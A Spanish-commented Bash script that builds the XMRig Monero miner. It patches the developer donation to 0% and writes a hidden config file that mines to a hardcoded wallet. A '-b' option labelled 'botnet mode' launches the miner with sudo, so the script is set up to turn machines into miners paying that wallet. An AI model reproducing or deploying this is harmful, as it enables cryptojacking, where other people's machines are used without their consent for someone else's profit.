#!/bin/bash

# File edited from suragu
# Archivo modificado de

export CVER=v6.24.0
export VER=6.24.0
export USER=44AeVaj9QXVgrRkCqKc9YLVHQ93DNHKm11TTU4v2eE55BQiywtNin3aMP4VY5dwPNASAxNxpGY4qUD6hvYgoN3JoSh2tscu


args=("$@")
[[ ${args[0]} = "-b" ]] && echo "/!\\ MODO BOTNET ACTIVADO /!\\"

echo "INSTALA LOS EQUIVALENTES A cmake, g++, wget, libssl-dev, libhwloc-dev y libuv1-dev en tu distro!!"
read -p "Pulsa enter para continuar cuando los hayas instalado"

mkdir -p xmrig && cd xmrig
wget https://github.com/xmrig/xmrig/archive/refs/tags/$CVER.tar.gz || exit
tar xvf $CVER.tar.gz && cd xmrig-$VER  
cat <<EOF > src/donate.h.patch
--- src/donate.h  2025-10-08 05:09:09.385674908 +0200
+++ src/donate.h.new  2025-10-08 05:07:09.011687801 +0200
@@ -37,8 +37,8 @@
  * If you plan on changing donations to 0%, please consider making a one-off donation to my wallet:
  * XMR: 48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD
  */
-constexpr const int kDefaultDonateLevel = 1;
-constexpr const int kMinimumDonateLevel = 1;
+constexpr const int kDefaultDonateLevel = 0;
+constexpr const int kMinimumDonateLevel = 0;
 
 
 #endif // XMRIG_DONATE_H
EOF
cat <<EOF > ${HOME}/.config/.xmrig.json
{
    "autosave": true,
    "donate-level": 0,
    "cpu": true,
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "url": "pool.supportxmr.com:443",
            "user": "$USER",
            "pass": "worker0",
            "keepalive": true,
            "tls": true
        }
    ]
}
EOF
cd src
patch -p1 < donate.h.patch || exit "no ha funcionado el patch"
cd ..
mkdir -p build && cd build
cmake -DWITH_CUDA=OFF -DWITH_OPENCL=OFF .. || exit "no ha funcionado el cmake"
make -j$(nproc) CFLAGS+="-march=native -mtune=native"  CXXFLAGS+="-march=native -mtune=native" || exit "no ha funcionado la compilacion"

echo "localizacion del binario: ${PWD}/xmrig"
echo "ejecutar con algo asi como sudo xmrig -c ~/.config/.xmrig.json"
echo "Quizá quieras cambiar ${HOME}/.config/.xmrig.json para cambiar el nombre del worker"

# modo botnet
[[ ${args[0]} = "-b" ]] && sudo ${PWD}/xmrig -c ~/.config/.xmrig.json
